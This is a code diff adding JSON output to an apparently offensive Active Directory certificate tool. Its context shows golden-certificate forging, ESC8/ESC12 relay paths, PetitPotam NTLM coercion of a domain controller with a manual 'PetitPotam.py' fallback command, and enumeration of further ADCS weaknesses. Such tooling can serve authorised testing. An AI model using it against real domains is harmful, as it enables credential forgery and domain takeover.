@@ -490,6 +490,21 @@ func runForge(cmd *cobra.Command) error {
 			fmt.Printf("[!] PFX export failed: %v\n", err)
 		}
 
+		outputJSON, _ := cmd.Flags().GetBool("json")
+		if outputJSON {
+			data, _ := json.MarshalIndent(map[string]string{
+				"type":     "golden_certificate",
+				"subject":  cert.Subject.CommonName,
+				"issuer":   cert.Issuer.CommonName,
+				"upn":      upn,
+				"serial":   cert.SerialNumber.Text(16),
+				"cert_path": basePath + ".crt",
+				"key_path":  basePath + ".key",
+				"pfx_path":  basePath + ".pfx",
+			}, "", "  ")
+			fmt.Println(string(data))
+			return nil
+		}
 		fmt.Printf("[+] Golden certificate (CA-signed) written to %s.crt / %s.pfx\n", basePath, basePath)
 		fmt.Printf("    Subject: %s\n", cert.Subject.CommonName)
 		fmt.Printf("    Issuer:  %s\n", cert.Issuer.CommonName)
@@ -551,6 +566,20 @@ func runForge(cmd *cobra.Command) error {
 		fmt.Printf("[!] PFX export failed: %v\n", err)
 	}
 
+	outputJSON, _ := cmd.Flags().GetBool("json")
+	if outputJSON {
+		data, _ := json.MarshalIndent(map[string]string{
+			"type":     "self_signed_certificate",
+			"subject":  cert.Subject.CommonName,
+			"upn":      upn,
+			"serial":   cert.SerialNumber.String(),
+			"cert_path": basePath + ".crt",
+			"key_path":  basePath + ".key",
+			"pfx_path":  basePath + ".pfx",
+		}, "", "  ")
+		fmt.Println(string(data))
+		return nil
+	}
 	fmt.Printf("[+] Golden certificate written to %s.crt / %s.pfx\n", basePath, basePath)
 	fmt.Printf("    Subject: %s\n", cert.Subject.CommonName)
 	fmt.Printf("    UPN: %s\n", upn)
@@ -632,6 +661,11 @@ func runExploit(cmd *cobra.Command, exploit string) error {
 		if len(esc8Findings) == 0 {
 			return fmt.Errorf("no vulnerable web enrollment endpoints found")
 		}
+		if cfg.OutputJSON {
+			data, _ := json.MarshalIndent(esc8Findings, "", "  ")
+			fmt.Println(string(data))
+			return nil
+		}
 		fmt.Println("\n[!] ESC8 relay attack — use ntlmrelayx to relay coerced NTLM auth:")
 		for _, f := range esc8Findings {
 			fmt.Printf("\n    Target: %s (%s)\n", f.CAName, f.CAHostname)
@@ -648,7 +682,7 @@ func runExploit(cmd *cobra.Command, exploit string) error {
 			} else {
 				fmt.Printf("\n[*] Triggering PetitPotam coercion: %s → %s (SMB/445)\n", cfg.TargetDC, listenerIP)
 			}
-			if coerceErr := pki.CoerceNTLMAuth(cfg.TargetDC, listenerIP, listenerPort, pki.CoercePetitPotam); coerceErr != nil {
+			if coerceErr := pki.CoerceNTLMAuth(cfg.TargetDC, listenerIP, listenerPort, pki.CoercePetitPotam, cfg); coerceErr != nil {
 				fmt.Printf("[!] PetitPotam coercion failed: %v\n", coerceErr)
 				fmt.Printf("[*] Manual: PetitPotam.py %s %s\n", listenerIP, cfg.TargetDC)
 			}
@@ -668,6 +702,11 @@ func runExploit(cmd *cobra.Command, exploit string) error {
 		}
 		if len(esc12Findings) == 0 {
 			return fmt.Errorf("no CAs with accessible DCOM endpoints found")
+		}
+		if cfg.OutputJSON {
+			data, _ := json.MarshalIndent(esc12Findings, "", "  ")
+			fmt.Println(string(data))
+			return nil
 		}
 		fmt.Println("\n[!] ESC12 DCOM relay attack — relay auth to ICertRequest DCOM interface:")
 		for _, f := range esc12Findings {
@@ -689,6 +728,11 @@ func runExploit(cmd *cobra.Command, exploit string) error {
 			fmt.Println("[*] No vulnerable PKI object ACLs found (ESC5).")
 			return nil
 		}
+		if cfg.OutputJSON {
+			data, _ := json.MarshalIndent(esc5Findings, "", "  ")
+			fmt.Println(string(data))
+			return nil
+		}
 		fmt.Println("\n[!] ESC5 — Vulnerable PKI object ACLs on CA:")
 		for _, f := range esc5Findings {
 			fmt.Printf("\n    CA: %s\n", f.CAName)
@@ -707,6 +751,11 @@ func runExploit(cmd *cobra.Command, exploit string) error {
 		}
 		if len(esc10Findings) == 0 {
 			fmt.Println("[*] No weak certificate mapping configurations found (ESC10).")
+			return nil
+		}
+		if cfg.OutputJSON {
+			data, _ := json.MarshalIndent(esc10Findings, "", "  ")
+			fmt.Println(string(data))
 			return nil
 		}
 		for _, f := range esc10Findings {
@@ -732,6 +781,11 @@ func runExploit(cmd *cobra.Command, exploit string) error {
 			fmt.Println("[*] No CAs with unencrypted RPC enrollment found (ESC11).")
 			return nil
 		}
+		if cfg.OutputJSON {
+			data, _ := json.MarshalIndent(esc11Findings, "", "  ")
+			fmt.Println(string(data))
+			return nil
+		}
 		fmt.Println("\n[!] ESC11 — RPC enrollment without encryption enforcement:")
 		for _, f := range esc11Findings {
 			fmt.Printf("\n    CA: %s (%s)\n", f.CAName, f.CAHostname)
@@ -750,6 +804,11 @@ func runExploit(cmd *cobra.Command, exploit string) error {
 		}
 		if len(esc14Findings) == 0 {
 			fmt.Println("[*] No templates vulnerable to weak explicit mapping found (ESC14).")
+			return nil
+		}
+		if cfg.OutputJSON {
+			data, _ := json.MarshalIndent(esc14Findings, "", "  ")
+			fmt.Println(string(data))
 			return nil
 		}
 		fmt.Println("\n[!] ESC14 — Weak explicit certificate mapping:")
